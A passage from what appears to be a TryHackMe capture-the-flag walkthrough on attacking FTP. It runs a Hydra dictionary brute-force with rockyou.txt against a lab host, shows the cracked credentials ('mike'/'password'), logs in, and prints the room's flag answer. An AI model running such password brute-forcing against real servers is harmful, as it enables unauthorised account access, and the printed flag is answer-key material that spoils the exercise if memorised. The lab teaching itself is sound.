Great! Now we've got details about the FTP server and, crucially, a possible username. Let's see what we can do with that...



## Exploiting FTP

#### Types of Exploit
Similarly to Telnet, when using FTP both the command and data channels are unencrypted. Any data sent over these channels can be intercepted and read.

With data from FTP being sent in plaintext, if a man-in-the-middle attack took place an attacker could reveal anything sent through this protocol (such as passwords). An article written by [JSCape](https://www.jscape.com/blog/bid/91906/Countering-Packet-Sniffers-Using-Encrypted-FTP) demonstrates and explains this process using APR-Poisoning to trick a victim into sending sensitive information to an attacker, rather than a legitimate source.

When looking at an FTP server from the position we find ourselves in for this machine, an avenue we can exploit is weak or default password configurations.

#### Method
So, from our enumeration stage, we know:
- There is an FTP server running on this machine
- We have a possible username

Using this information, let's try and bruteforce the password of the FTP Server.

#### Using Hydra to Bruteforce
Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. The syntax for the command we're going to use to find the passwords is this:
```bash
$ hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp

# EXPLANATION:
# hydra                   Runs the hydra tool
# -t 4                    Number of parallel connections per target
# -l [user]               Points to the user who's account you're trying to compromise
# -P [path to dictionary] Points to the file containing the list of possible passwords
# -vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt
# [machine IP]            The IP address of the target machine
# ftp / protocol          Sets the protocol
```

#### Answer
What is the password for the user "mike"?
```bash
$ hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt.gz -vV 10.10.13.98 ftp
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-07 00:25:31
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ftp://10.10.13.98:21/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.10.13.98 - login "mike" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.13.98 - login "mike" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.13.98 - login "mike" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.13.98 - login "mike" - pass "password" - 4 of 14344399 [child 3] (0/0)
[21][ftp] host: 10.10.13.98   login: mike   password: password
[STATUS] attack finished for 10.10.13.98 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-07 00:25:38
```
We got result! It's login: `mike` and password: **`password`**.

Bingo! Now, let's connect to the FTP server as this user using `ftp [IP]` and entering the credentials when prompted.
```bash
$ ftp 10.10.13.98                                                              
Connected to 10.10.13.98.
220 Welcome to the administrator FTP service.
Name (10.10.13.98:kali): mike
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

What is ftp.txt?
```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Apr 24  2020 ftp
-rwxrwxrwx    1 0        0              26 Apr 24  2020 ftp.txt
226 Directory send OK.
ftp> get ftp.txt
local: ftp.txt remote: ftp.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ftp.txt (26 bytes).
226 Transfer complete.
26 bytes received in 0.00 secs (40.0483 kB/s)
```

Output from ftp.txt:
```
THM{y0u_g0t_th3_ftp_fl4g}
```
The flag is **THM{y0u_g0t_th3_ftp_fl4g}**.

